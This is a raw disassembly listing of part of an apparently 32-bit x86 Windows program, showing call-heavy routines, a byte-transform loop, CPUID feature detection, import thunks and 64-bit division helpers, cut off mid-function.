  403efa:	5a                   	pop    %edx
  403efb:	50                   	push   %eax
  403efc:	68 01 00 00 00       	push   $0x1
  403f01:	ff 35 1c 70 41 00    	push   0x41701c
  403f07:	e8 34 8e 00 00       	call   0x40cd40
  403f0c:	e8 71 12 00 00       	call   0x405182
  403f11:	01 14 24             	add    %edx,(%esp)
  403f14:	e8 17 1f 00 00       	call   0x405e30
  403f19:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403f1d:	50                   	push   %eax
  403f1e:	e8 dd 9b 00 00       	call   0x40db00
  403f23:	52                   	push   %edx
  403f24:	e8 97 9b 00 00       	call   0x40dac0
  403f29:	5a                   	pop    %edx
  403f2a:	50                   	push   %eax
  403f2b:	52                   	push   %edx
  403f2c:	e8 8f 9b 00 00       	call   0x40dac0
  403f31:	5a                   	pop    %edx
  403f32:	50                   	push   %eax
  403f33:	52                   	push   %edx
  403f34:	e8 87 9b 00 00       	call   0x40dac0
  403f39:	5a                   	pop    %edx
  403f3a:	50                   	push   %eax
  403f3b:	52                   	push   %edx
  403f3c:	e8 7f 9b 00 00       	call   0x40dac0
  403f41:	5a                   	pop    %edx
  403f42:	50                   	push   %eax
  403f43:	68 01 00 00 00       	push   $0x1
  403f48:	ff 74 24 3c          	push   0x3c(%esp)
  403f4c:	e8 ef 8d 00 00       	call   0x40cd40
  403f51:	e8 2c 12 00 00       	call   0x405182
  403f56:	01 14 24             	add    %edx,(%esp)
  403f59:	e8 d2 1e 00 00       	call   0x405e30
  403f5e:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403f62:	50                   	push   %eax
  403f63:	e8 98 9b 00 00       	call   0x40db00
  403f68:	ff 74 24 28          	push   0x28(%esp)
  403f6c:	e8 40 f2 ff ff       	call   0x4031b1
  403f71:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  403f75:	52                   	push   %edx
  403f76:	e8 45 9b 00 00       	call   0x40dac0
  403f7b:	5a                   	pop    %edx
  403f7c:	50                   	push   %eax
  403f7d:	ff 74 24 30          	push   0x30(%esp)
  403f81:	e8 c8 e2 ff ff       	call   0x40224e
  403f86:	e8 15 12 00 00       	call   0x4051a0
  403f8b:	e8 64 df ff ff       	call   0x401ef4
  403f90:	ff 74 24 2c          	push   0x2c(%esp)
  403f94:	e8 ca 01 00 00       	call   0x404163
  403f99:	52                   	push   %edx
  403f9a:	e8 21 9b 00 00       	call   0x40dac0
  403f9f:	5a                   	pop    %edx
  403fa0:	50                   	push   %eax
  403fa1:	ff 74 24 10          	push   0x10(%esp)
  403fa5:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  403fa9:	83 c3 04             	add    $0x4,%ebx
  403fac:	53                   	push   %ebx
  403fad:	58                   	pop    %eax
  403fae:	e8 4d 11 00 00       	call   0x405100
  403fb3:	50                   	push   %eax
  403fb4:	e8 5f f7 ff ff       	call   0x403718
  403fb9:	8d 05 24 70 41 00    	lea    0x417024,%eax
  403fbf:	50                   	push   %eax
  403fc0:	e8 3b 9b 00 00       	call   0x40db00
  403fc5:	ff 35 24 70 41 00    	push   0x417024
  403fcb:	e8 9d 13 00 00       	call   0x40536d
  403fd0:	ff 74 24 2c          	push   0x2c(%esp)
  403fd4:	e8 10 e1 ff ff       	call   0x4020e9
  403fd9:	ff 35 24 70 41 00    	push   0x417024
  403fdf:	ff 74 24 20          	push   0x20(%esp)
  403fe3:	e8 18 55 00 00       	call   0x409500
  403fe8:	e8 62 e1 ff ff       	call   0x40214f
  403fed:	52                   	push   %edx
  403fee:	e8 cd 9a 00 00       	call   0x40dac0
  403ff3:	5a                   	pop    %edx
  403ff4:	50                   	push   %eax
  403ff5:	ff 74 24 28          	push   0x28(%esp)
  403ff9:	e8 23 dc ff ff       	call   0x401c21
  403ffe:	8d 44 24 34          	lea    0x34(%esp),%eax
  404002:	50                   	push   %eax
  404003:	e8 f8 9a 00 00       	call   0x40db00
  404008:	8b 1d 38 70 41 00    	mov    0x417038,%ebx
  40400e:	83 fb 01             	cmp    $0x1,%ebx
  404011:	75 18                	jne    0x40402b
  404013:	8b 44 24 28          	mov    0x28(%esp),%eax
  404017:	50                   	push   %eax
  404018:	8d 05 bd 2f 40 00    	lea    0x402fbd,%eax
  40401e:	50                   	push   %eax
  40401f:	e8 68 14 00 00       	call   0x40548c
  404024:	a3 f4 6f 41 00       	mov    %eax,0x416ff4
  404029:	eb 09                	jmp    0x404034
  40402b:	ff 74 24 28          	push   0x28(%esp)
  40402f:	e8 89 ef ff ff       	call   0x402fbd
  404034:	52                   	push   %edx
  404035:	e8 86 9a 00 00       	call   0x40dac0
  40403a:	5a                   	pop    %edx
  40403b:	50                   	push   %eax
  40403c:	ba 3a 60 41 00       	mov    $0x41603a,%edx
  404041:	52                   	push   %edx
  404042:	e8 19 9c 00 00       	call   0x40dc60
  404047:	52                   	push   %edx
  404048:	e8 73 9a 00 00       	call   0x40dac0
  40404d:	5a                   	pop    %edx
  40404e:	50                   	push   %eax
  40404f:	52                   	push   %edx
  404050:	e8 6b 9a 00 00       	call   0x40dac0
  404055:	5a                   	pop    %edx
  404056:	50                   	push   %eax
  404057:	68 02 00 00 00       	push   $0x2
  40405c:	ff 74 24 20          	push   0x20(%esp)
  404060:	e8 4b 20 00 00       	call   0x4060b0
  404065:	58                   	pop    %eax
  404066:	8d 44 24 14          	lea    0x14(%esp),%eax
  40406a:	50                   	push   %eax
  40406b:	e8 90 9a 00 00       	call   0x40db00
  404070:	52                   	push   %edx
  404071:	e8 4a 9a 00 00       	call   0x40dac0
  404076:	5a                   	pop    %edx
  404077:	50                   	push   %eax
  404078:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  40407c:	52                   	push   %edx
  40407d:	e8 3e 9a 00 00       	call   0x40dac0
  404082:	5a                   	pop    %edx
  404083:	50                   	push   %eax
  404084:	52                   	push   %edx
  404085:	e8 d6 9b 00 00       	call   0x40dc60
  40408a:	ba 26 60 41 00       	mov    $0x416026,%edx
  40408f:	52                   	push   %edx
  404090:	e8 cb 9b 00 00       	call   0x40dc60
  404095:	8b 54 24 38          	mov    0x38(%esp),%edx
  404099:	52                   	push   %edx
  40409a:	e8 c1 9b 00 00       	call   0x40dc60
  40409f:	e8 1c 9c 00 00       	call   0x40dcc0
  4040a4:	52                   	push   %edx
  4040a5:	e8 16 9a 00 00       	call   0x40dac0
  4040aa:	5a                   	pop    %edx
  4040ab:	50                   	push   %eax
  4040ac:	52                   	push   %edx
  4040ad:	e8 0e 9a 00 00       	call   0x40dac0
  4040b2:	5a                   	pop    %edx
  4040b3:	50                   	push   %eax
  4040b4:	e8 7c 63 00 00       	call   0x40a435
  4040b9:	e8 02 9c 00 00       	call   0x40dcc0
  4040be:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  4040c2:	52                   	push   %edx
  4040c3:	e8 f8 99 00 00       	call   0x40dac0
  4040c8:	5a                   	pop    %edx
  4040c9:	50                   	push   %eax
  4040ca:	52                   	push   %edx
  4040cb:	e8 90 9b 00 00       	call   0x40dc60
  4040d0:	8b 54 24 20          	mov    0x20(%esp),%edx
  4040d4:	52                   	push   %edx
  4040d5:	e8 86 9b 00 00       	call   0x40dc60
  4040da:	e8 a3 10 00 00       	call   0x405182
  4040df:	01 14 24             	add    %edx,(%esp)
  4040e2:	e8 9b 10 00 00       	call   0x405182
  4040e7:	01 54 24 04          	add    %edx,0x4(%esp)
  4040eb:	e8 92 10 00 00       	call   0x405182
  4040f0:	01 54 24 08          	add    %edx,0x8(%esp)
  4040f4:	e8 60 dc ff ff       	call   0x401d59
  4040f9:	e8 a2 10 00 00       	call   0x4051a0
  4040fe:	89 44 24 34          	mov    %eax,0x34(%esp)
  404102:	ff 74 24 34          	push   0x34(%esp)
  404106:	e8 eb db ff ff       	call   0x401cf6
  40410b:	31 c0                	xor    %eax,%eax
  40410d:	ff 74 24 18          	push   0x18(%esp)
  404111:	e8 7a 9a 00 00       	call   0x40db90
  404116:	ff 74 24 28          	push   0x28(%esp)
  40411a:	e8 71 9a 00 00       	call   0x40db90
  40411f:	ff 74 24 30          	push   0x30(%esp)
  404123:	e8 68 9a 00 00       	call   0x40db90
  404128:	ff 74 24 10          	push   0x10(%esp)
  40412c:	e8 5f 9a 00 00       	call   0x40db90
  404131:	ff 74 24 0c          	push   0xc(%esp)
  404135:	e8 56 9a 00 00       	call   0x40db90
  40413a:	ff 74 24 08          	push   0x8(%esp)
  40413e:	e8 4d 9a 00 00       	call   0x40db90
  404143:	ff 74 24 14          	push   0x14(%esp)
  404147:	e8 44 9a 00 00       	call   0x40db90
  40414c:	ff 74 24 20          	push   0x20(%esp)
  404150:	e8 3b 9a 00 00       	call   0x40db90
  404155:	ff 74 24 1c          	push   0x1c(%esp)
  404159:	e8 32 9a 00 00       	call   0x40db90
  40415e:	83 c4 38             	add    $0x38,%esp
  404161:	5b                   	pop    %ebx
  404162:	c3                   	ret
  404163:	53                   	push   %ebx
  404164:	31 c0                	xor    %eax,%eax
  404166:	50                   	push   %eax
  404167:	50                   	push   %eax
  404168:	50                   	push   %eax
  404169:	50                   	push   %eax
  40416a:	50                   	push   %eax
  40416b:	e8 90 9a 00 00       	call   0x40dc00
  404170:	b8 a7 60 41 00       	mov    $0x4160a7,%eax
  404175:	a3 0c 70 41 00       	mov    %eax,0x41700c
  40417a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404181:	eb 00                	jmp    0x404183
  404183:	b8 1b 00 00 00       	mov    $0x1b,%eax
  404188:	3b 04 24             	cmp    (%esp),%eax
  40418b:	7c 64                	jl     0x4041f1
  40418d:	a1 0c 70 41 00       	mov    0x41700c,%eax
  404192:	0f be 00             	movsbl (%eax),%eax
  404195:	89 44 24 04          	mov    %eax,0x4(%esp)
  404199:	ff 05 0c 70 41 00    	incl   0x41700c
  40419f:	52                   	push   %edx
  4041a0:	e8 1b 99 00 00       	call   0x40dac0
  4041a5:	5a                   	pop    %edx
  4041a6:	50                   	push   %eax
  4041a7:	52                   	push   %edx
  4041a8:	e8 13 99 00 00       	call   0x40dac0
  4041ad:	5a                   	pop    %edx
  4041ae:	50                   	push   %eax
  4041af:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  4041b3:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  4041b6:	53                   	push   %ebx
  4041b7:	e8 54 1d 00 00       	call   0x405f10
  4041bc:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4041c0:	50                   	push   %eax
  4041c1:	e8 3a 99 00 00       	call   0x40db00
  4041c6:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4041ca:	52                   	push   %edx
  4041cb:	e8 f0 98 00 00       	call   0x40dac0
  4041d0:	5a                   	pop    %edx
  4041d1:	50                   	push   %eax
  4041d2:	52                   	push   %edx
  4041d3:	e8 88 9a 00 00       	call   0x40dc60
  4041d8:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4041dc:	52                   	push   %edx
  4041dd:	e8 7e 9a 00 00       	call   0x40dc60
  4041e2:	8d 44 24 10          	lea    0x10(%esp),%eax
  4041e6:	50                   	push   %eax
  4041e7:	e8 14 99 00 00       	call   0x40db00
  4041ec:	ff 04 24             	incl   (%esp)
  4041ef:	71 92                	jno    0x404183
  4041f1:	52                   	push   %edx
  4041f2:	e8 c9 98 00 00       	call   0x40dac0
  4041f7:	5a                   	pop    %edx
  4041f8:	50                   	push   %eax
  4041f9:	ff 74 24 10          	push   0x10(%esp)
  4041fd:	ff 74 24 24          	push   0x24(%esp)
  404201:	58                   	pop    %eax
  404202:	e8 f9 0e 00 00       	call   0x405100
  404207:	50                   	push   %eax
  404208:	e8 0b f5 ff ff       	call   0x403718
  40420d:	8d 44 24 14          	lea    0x14(%esp),%eax
  404211:	50                   	push   %eax
  404212:	e8 e9 98 00 00       	call   0x40db00
  404217:	ff 74 24 10          	push   0x10(%esp)
  40421b:	e8 7a 63 00 00       	call   0x40a59a
  404220:	31 c0                	xor    %eax,%eax
  404222:	ff 74 24 0c          	push   0xc(%esp)
  404226:	e8 65 99 00 00       	call   0x40db90
  40422b:	ff 74 24 08          	push   0x8(%esp)
  40422f:	e8 5c 99 00 00       	call   0x40db90
  404234:	ff 74 24 10          	push   0x10(%esp)
  404238:	e8 53 99 00 00       	call   0x40db90
  40423d:	83 c4 14             	add    $0x14,%esp
  404240:	5b                   	pop    %ebx
  404241:	c2 04 00             	ret    $0x4
  404244:	ff 74 24 04          	push   0x4(%esp)
  404248:	e8 53 55 00 00       	call   0x4097a0
  40424d:	eb 02                	jmp    0x404251
  40424f:	31 c0                	xor    %eax,%eax
  404251:	c2 04 00             	ret    $0x4
  404254:	53                   	push   %ebx
  404255:	57                   	push   %edi
  404256:	31 c0                	xor    %eax,%eax
  404258:	50                   	push   %eax
  404259:	50                   	push   %eax
  40425a:	50                   	push   %eax
  40425b:	50                   	push   %eax
  40425c:	50                   	push   %eax
  40425d:	e8 9e 99 00 00       	call   0x40dc00
  404262:	8b 54 24 20          	mov    0x20(%esp),%edx
  404266:	8d 0c 24             	lea    (%esp),%ecx
  404269:	e8 f2 0d 00 00       	call   0x405060
  40426e:	8b 1d 20 70 41 00    	mov    0x417020,%ebx
  404274:	83 fb 01             	cmp    $0x1,%ebx
  404277:	74 13                	je     0x40428c
  404279:	ff 34 24             	push   (%esp)
  40427c:	e8 c4 e2 ff ff       	call   0x402545
  404281:	21 c0                	and    %eax,%eax
  404283:	74 07                	je     0x40428c
  404285:	b8 01 00 00 00       	mov    $0x1,%eax
  40428a:	eb 02                	jmp    0x40428e
  40428c:	31 c0                	xor    %eax,%eax
  40428e:	21 c0                	and    %eax,%eax
  404290:	74 05                	je     0x404297
  404292:	e9 9e 00 00 00       	jmp    0x404335
  404297:	ff 34 24             	push   (%esp)
  40429a:	68 ff ff ff ff       	push   $0xffffffff
  40429f:	e8 6c 66 00 00       	call   0x40a910
  4042a4:	89 44 24 04          	mov    %eax,0x4(%esp)
  4042a8:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  4042ad:	74 7e                	je     0x40432d
  4042af:	ff 74 24 2c          	push   0x2c(%esp)
  4042b3:	ff 74 24 2c          	push   0x2c(%esp)
  4042b7:	5b                   	pop    %ebx
  4042b8:	5f                   	pop    %edi
  4042b9:	83 ff 00             	cmp    $0x0,%edi
  4042bc:	7f 0b                	jg     0x4042c9
  4042be:	7c 05                	jl     0x4042c5
  4042c0:	83 fb 00             	cmp    $0x0,%ebx
  4042c3:	77 04                	ja     0x4042c9
  4042c5:	31 c0                	xor    %eax,%eax
  4042c7:	eb 05                	jmp    0x4042ce
  4042c9:	b8 01 00 00 00       	mov    $0x1,%eax
  4042ce:	09 c0                	or     %eax,%eax
  4042d0:	74 1d                	je     0x4042ef
  4042d2:	8b 44 24 28          	mov    0x28(%esp),%eax
  4042d6:	50                   	push   %eax
  4042d7:	ff 74 24 28          	push   0x28(%esp)
  4042db:	ff 74 24 0c          	push   0xc(%esp)
  4042df:	e8 0c 69 00 00       	call   0x40abf0
  4042e4:	99                   	cltd
  4042e5:	52                   	push   %edx
  4042e6:	50                   	push   %eax
  4042e7:	8f 44 24 0c          	pop    0xc(%esp)
  4042eb:	8f 44 24 0c          	pop    0xc(%esp)
  4042ef:	ff 74 24 04          	push   0x4(%esp)
  4042f3:	e8 18 63 00 00       	call   0x40a610
  4042f8:	ff 74 24 0c          	push   0xc(%esp)
  4042fc:	ff 74 24 0c          	push   0xc(%esp)
  404300:	5b                   	pop    %ebx
  404301:	5f                   	pop    %edi
  404302:	3b 5c 24 28          	cmp    0x28(%esp),%ebx
  404306:	75 06                	jne    0x40430e
  404308:	3b 7c 24 2c          	cmp    0x2c(%esp),%edi
  40430c:	74 04                	je     0x404312
  40430e:	31 c0                	xor    %eax,%eax
  404310:	eb 05                	jmp    0x404317
  404312:	b8 01 00 00 00       	mov    $0x1,%eax
  404317:	09 c0                	or     %eax,%eax
  404319:	74 0a                	je     0x404325
  40431b:	c7 44 24 10 01 00 00 	movl   $0x1,0x10(%esp)
  404322:	00 
  404323:	eb 08                	jmp    0x40432d
  404325:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  40432c:	00 
  40432d:	8b 44 24 10          	mov    0x10(%esp),%eax
  404331:	eb 02                	jmp    0x404335
  404333:	31 c0                	xor    %eax,%eax
  404335:	ff 34 24             	push   (%esp)
  404338:	e8 53 98 00 00       	call   0x40db90
  40433d:	83 c4 14             	add    $0x14,%esp
  404340:	5f                   	pop    %edi
  404341:	5b                   	pop    %ebx
  404342:	c2 10 00             	ret    $0x10

Disassembly of section .text:

00405000 <.text>:
  405000:	bd 00 00 00 00       	mov    $0x0,%ebp
  405005:	9c                   	pushf
  405006:	58                   	pop    %eax
  405007:	bd 00 00 00 00       	mov    $0x0,%ebp
  40500c:	89 c1                	mov    %eax,%ecx
  40500e:	35 00 00 20 00       	xor    $0x200000,%eax
  405013:	50                   	push   %eax
  405014:	9d                   	popf
  405015:	9c                   	pushf
  405016:	58                   	pop    %eax
  405017:	31 c8                	xor    %ecx,%eax
  405019:	74 3e                	je     0x405059
  40501b:	b8 01 00 00 00       	mov    $0x1,%eax
  405020:	0f a2                	cpuid
  405022:	89 d0                	mov    %edx,%eax
  405024:	25 00 00 80 00       	and    $0x800000,%eax
  405029:	74 2e                	je     0x405059
  40502b:	83 cd 02             	or     $0x2,%ebp
  40502e:	89 d0                	mov    %edx,%eax
  405030:	25 00 00 00 02       	and    $0x2000000,%eax
  405035:	74 0f                	je     0x405046
  405037:	83 cd 08             	or     $0x8,%ebp
  40503a:	89 d0                	mov    %edx,%eax
  40503c:	25 00 00 00 04       	and    $0x4000000,%eax
  405041:	74 03                	je     0x405046
  405043:	83 cd 10             	or     $0x10,%ebp
  405046:	b8 01 00 00 80       	mov    $0x80000001,%eax
  40504b:	0f a2                	cpuid
  40504d:	89 d0                	mov    %edx,%eax
  40504f:	25 00 00 00 80       	and    $0x80000000,%eax
  405054:	74 03                	je     0x405059
  405056:	83 cd 04             	or     $0x4,%ebp
  405059:	89 e8                	mov    %ebp,%eax
  40505b:	c3                   	ret
  40505c:	cc                   	int3
  40505d:	cc                   	int3
  40505e:	cc                   	int3
  40505f:	cc                   	int3
  405060:	52                   	push   %edx
  405061:	51                   	push   %ecx
  405062:	e8 b9 8c 00 00       	call   0x40dd20
  405067:	c3                   	ret
  405068:	52                   	push   %edx
  405069:	51                   	push   %ecx
  40506a:	e8 01 8d 00 00       	call   0x40dd70
  40506f:	c3                   	ret
  405070:	ff 25 5c 64 41 00    	jmp    *0x41645c
  405076:	ff 25 9c 64 41 00    	jmp    *0x41649c
  40507c:	ff 25 a0 64 41 00    	jmp    *0x4164a0
  405082:	ff 25 a4 64 41 00    	jmp    *0x4164a4
  405088:	ff 25 a8 64 41 00    	jmp    *0x4164a8
  40508e:	ff 25 ac 64 41 00    	jmp    *0x4164ac
  405094:	ff 25 b0 64 41 00    	jmp    *0x4164b0
  40509a:	ff 25 b4 64 41 00    	jmp    *0x4164b4
  4050a0:	ff 25 b8 64 41 00    	jmp    *0x4164b8
  4050a6:	ff 25 bc 64 41 00    	jmp    *0x4164bc
  4050ac:	ff 25 c0 64 41 00    	jmp    *0x4164c0
  4050b2:	ff 25 c4 64 41 00    	jmp    *0x4164c4
  4050b8:	ff 25 c8 64 41 00    	jmp    *0x4164c8
  4050be:	ff 25 cc 64 41 00    	jmp    *0x4164cc
  4050c4:	ff 25 d0 64 41 00    	jmp    *0x4164d0
  4050ca:	ff 25 d4 64 41 00    	jmp    *0x4164d4
  4050d0:	ff 25 d8 64 41 00    	jmp    *0x4164d8
  4050d6:	ff 25 dc 64 41 00    	jmp    *0x4164dc
  4050dc:	ff 25 e0 64 41 00    	jmp    *0x4164e0
  4050e2:	ff 25 e4 64 41 00    	jmp    *0x4164e4
  4050e8:	ff 25 e8 64 41 00    	jmp    *0x4164e8
  4050ee:	ff 25 ec 64 41 00    	jmp    *0x4164ec
  4050f4:	ff 25 f0 64 41 00    	jmp    *0x4164f0
  4050fa:	cc                   	int3
  4050fb:	cc                   	int3
  4050fc:	cc                   	int3
  4050fd:	cc                   	int3
  4050fe:	cc                   	int3
  4050ff:	cc                   	int3
  405100:	0f bf 00             	movswl (%eax),%eax
  405103:	c3                   	ret
  405104:	cc                   	int3
  405105:	cc                   	int3
  405106:	cc                   	int3
  405107:	cc                   	int3
  405108:	cc                   	int3
  405109:	cc                   	int3
  40510a:	cc                   	int3
  40510b:	cc                   	int3
  40510c:	cc                   	int3
  40510d:	cc                   	int3
  40510e:	cc                   	int3
  40510f:	cc                   	int3
  405110:	8b 54 24 04          	mov    0x4(%esp),%edx
  405114:	89 10                	mov    %edx,(%eax)
  405116:	c2 04 00             	ret    $0x4
  405119:	cc                   	int3
  40511a:	cc                   	int3
  40511b:	cc                   	int3
  40511c:	cc                   	int3
  40511d:	cc                   	int3
  40511e:	cc                   	int3
  40511f:	cc                   	int3
  405120:	09 d2                	or     %edx,%edx
  405122:	75 05                	jne    0x405129
  405124:	ba 66 60 41 00       	mov    $0x416066,%edx
  405129:	09 c9                	or     %ecx,%ecx
  40512b:	75 05                	jne    0x405132
  40512d:	b9 66 60 41 00       	mov    $0x416066,%ecx
  405132:	53                   	push   %ebx
  405133:	66 8b 02             	mov    (%edx),%ax
  405136:	83 c2 02             	add    $0x2,%edx
  405139:	66 8b 19             	mov    (%ecx),%bx
  40513c:	83 c1 02             	add    $0x2,%ecx
  40513f:	66 39 d8             	cmp    %bx,%ax
  405142:	75 0e                	jne    0x405152
  405144:	66 09 c0             	or     %ax,%ax
  405147:	75 ea                	jne    0x405133
  405149:	5b                   	pop    %ebx
  40514a:	b8 01 00 00 00       	mov    $0x1,%eax
  40514f:	85 c0                	test   %eax,%eax
  405151:	c3                   	ret
  405152:	5b                   	pop    %ebx
  405153:	31 c0                	xor    %eax,%eax
  405155:	85 c0                	test   %eax,%eax
  405157:	c3                   	ret
  405158:	cc                   	int3
  405159:	cc                   	int3
  40515a:	cc                   	int3
  40515b:	cc                   	int3
  40515c:	cc                   	int3
  40515d:	cc                   	int3
  40515e:	cc                   	int3
  40515f:	cc                   	int3
  405160:	52                   	push   %edx
  405161:	ff 74 24 08          	push   0x8(%esp)
  405165:	e8 d6 91 00 00       	call   0x40e340
  40516a:	5a                   	pop    %edx
  40516b:	c2 04 00             	ret    $0x4
  40516e:	cc                   	int3
  40516f:	cc                   	int3
  405170:	52                   	push   %edx
  405171:	51                   	push   %ecx
  405172:	ff 35 68 61 41 00    	push   0x416168
  405178:	e8 cc 01 00 00       	call   0x405349
  40517d:	8b 00                	mov    (%eax),%eax
  40517f:	59                   	pop    %ecx
  405180:	5a                   	pop    %edx
  405181:	c3                   	ret
  405182:	50                   	push   %eax
  405183:	ff 35 68 61 41 00    	push   0x416168
  405189:	e8 bb 01 00 00       	call   0x405349
  40518e:	8b 10                	mov    (%eax),%edx
  405190:	58                   	pop    %eax
  405191:	c3                   	ret
  405192:	cc                   	int3
  405193:	cc                   	int3
  405194:	cc                   	int3
  405195:	cc                   	int3
  405196:	cc                   	int3
  405197:	cc                   	int3
  405198:	cc                   	int3
  405199:	cc                   	int3
  40519a:	cc                   	int3
  40519b:	cc                   	int3
  40519c:	cc                   	int3
  40519d:	cc                   	int3
  40519e:	cc                   	int3
  40519f:	cc                   	int3
  4051a0:	50                   	push   %eax
  4051a1:	52                   	push   %edx
  4051a2:	ff 74 24 0c          	push   0xc(%esp)
  4051a6:	e8 d5 91 00 00       	call   0x40e380
  4051ab:	5a                   	pop    %edx
  4051ac:	58                   	pop    %eax
  4051ad:	c2 04 00             	ret    $0x4
  4051b0:	57                   	push   %edi
  4051b1:	56                   	push   %esi
  4051b2:	53                   	push   %ebx
  4051b3:	31 ff                	xor    %edi,%edi
  4051b5:	8b 44 24 14          	mov    0x14(%esp),%eax
  4051b9:	09 c0                	or     %eax,%eax
  4051bb:	7d 14                	jge    0x4051d1
  4051bd:	47                   	inc    %edi
  4051be:	8b 54 24 10          	mov    0x10(%esp),%edx
  4051c2:	f7 d8                	neg    %eax
  4051c4:	f7 da                	neg    %edx
  4051c6:	83 d8 00             	sbb    $0x0,%eax
  4051c9:	89 44 24 14          	mov    %eax,0x14(%esp)
  4051cd:	89 54 24 10          	mov    %edx,0x10(%esp)
  4051d1:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4051d5:	09 c0                	or     %eax,%eax
  4051d7:	7d 14                	jge    0x4051ed
  4051d9:	47                   	inc    %edi
  4051da:	8b 54 24 18          	mov    0x18(%esp),%edx
  4051de:	f7 d8                	neg    %eax
  4051e0:	f7 da                	neg    %edx
  4051e2:	83 d8 00             	sbb    $0x0,%eax
  4051e5:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4051e9:	89 54 24 18          	mov    %edx,0x18(%esp)
  4051ed:	09 c0                	or     %eax,%eax
  4051ef:	75 18                	jne    0x405209
  4051f1:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4051f5:	8b 44 24 14          	mov    0x14(%esp),%eax
  4051f9:	31 d2                	xor    %edx,%edx
  4051fb:	f7 f1                	div    %ecx
  4051fd:	89 c3                	mov    %eax,%ebx
  4051ff:	8b 44 24 10          	mov    0x10(%esp),%eax
  405203:	f7 f1                	div    %ecx
  405205:	89 da                	mov    %ebx,%edx
  405207:	eb 41                	jmp    0x40524a
  405209:	89 c3                	mov    %eax,%ebx
  40520b:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40520f:	8b 54 24 14          	mov    0x14(%esp),%edx
  405213:	8b 44 24 10          	mov    0x10(%esp),%eax
  405217:	d1 eb                	shr    $1,%ebx
  405219:	d1 d9                	rcr    $1,%ecx
  40521b:	d1 ea                	shr    $1,%edx
  40521d:	d1 d8                	rcr    $1,%eax
  40521f:	09 db                	or     %ebx,%ebx
  405221:	75 f4                	jne    0x405217
  405223:	f7 f1                	div    %ecx
  405225:	89 c6                	mov    %eax,%esi
  405227:	f7 64 24 1c          	mull   0x1c(%esp)
  40522b:	89 c1                	mov    %eax,%ecx
  40522d:	8b 44 24 18          	mov    0x18(%esp),%eax
  405231:	f7 e6                	mul    %esi
  405233:	01 ca                	add    %ecx,%edx
  405235:	72 0e                	jb     0x405245
  405237:	3b 54 24 14          	cmp    0x14(%esp),%edx
  40523b:	77 08                	ja     0x405245
  40523d:	72 07                	jb     0x405246
  40523f:	3b 44 24 10          	cmp    0x10(%esp),%eax
  405243:	76 01                	jbe    0x405246
  405245:	4e                   	dec    %esi
  405246:	31 d2                	xor    %edx,%edx
  405248:	89 f0                	mov    %esi,%eax
  40524a:	4f                   	dec    %edi
  40524b:	75 07                	jne    0x405254
  40524d:	f7 da                	neg    %edx
  40524f:	f7 d8                	neg    %eax
  405251:	83 da 00             	sbb    $0x0,%edx
  405254:	5b                   	pop    %ebx
  405255:	5e                   	pop    %esi
  405256:	5f                   	pop    %edi
  405257:	c2 10 00             	ret    $0x10
  40525a:	00 00                	add    %al,(%eax)
  40525c:	cc                   	int3
  40525d:	cc                   	int3
  40525e:	cc                   	int3
  40525f:	cc                   	int3
  405260:	56                   	push   %esi
  405261:	8b 44 24 14          	mov    0x14(%esp),%eax
  405265:	0b c0                	or     %eax,%eax
  405267:	75 28                	jne    0x405291
  405269:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40526d:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405271:	33 d2                	xor    %edx,%edx
  405273:	f7 f1                	div    %ecx
  405275:	8b d8                	mov    %eax,%ebx
  405277:	8b 44 24 08          	mov    0x8(%esp),%eax
  40527b:	f7 f1                	div    %ecx
  40527d:	8b f0                	mov    %eax,%esi
  40527f:	8b c3                	mov    %ebx,%eax
  405281:	f7 64 24 10          	mull   0x10(%esp)
  405285:	8b c8                	mov    %eax,%ecx
  405287:	8b c6                	mov    %esi,%eax
  405289:	f7 64 24 10          	mull   0x10(%esp)
  40528d:	03 d1                	add    %ecx,%edx
  40528f:	eb 47                	jmp    0x4052d8
  405291:	8b c8                	mov    %eax,%ecx
  405293:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  405297:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40529b:	8b 44 24 08          	mov    0x8(%esp),%eax
  40529f:	d1 e9                	shr    $1,%ecx
  4052a1:	d1 db                	rcr    $1,%ebx
  4052a3:	d1 ea                	shr    $1,%edx
  4052a5:	d1 d8                	rcr    $1,%eax
  4052a7:	0b c9                	or     %ecx,%ecx
  4052a9:	75 f4                	jne    0x40529f
  4052ab:	f7 f3                	div    %ebx
  4052ad:	8b f0                	mov    %eax,%esi
  4052af:	f7 64 24 14          	mull   0x14(%esp)
  4052b3:	8b c8                	mov    %eax,%ecx
  4052b5:	8b 44 24 10          	mov    0x10(%esp),%eax
  4052b9:	f7 e6                	mul    %esi
  4052bb:	03 d1                	add    %ecx,%edx
  4052bd:	72 0e                	jb     0x4052cd
  4052bf:	3b 54 24 0c          	cmp    0xc(%esp),%edx
  4052c3:	77 08                	ja     0x4052cd
  4052c5:	72 0f                	jb     0x4052d6
  4052c7:	3b 44 24 08          	cmp    0x8(%esp),%eax
  4052cb:	76 09                	jbe    0x4052d6
  4052cd:	4e                   	dec    %esi
  4052ce:	2b 44 24 10          	sub    0x10(%esp),%eax
  4052d2:	1b 54 24 14          	sbb    0x14(%esp),%edx
  4052d6:	33 db                	xor    %ebx,%ebx
  4052d8:	2b 44 24 08          	sub    0x8(%esp),%eax
  4052dc:	1b 54 24 0c          	sbb    0xc(%esp),%edx
  4052e0:	f7 da                	neg    %edx
  4052e2:	f7 d8                	neg    %eax
  4052e4:	83 da 00             	sbb    $0x0,%edx
  4052e7:	8b ca                	mov    %edx,%ecx
  4052e9:	8b d3                	mov    %ebx,%edx
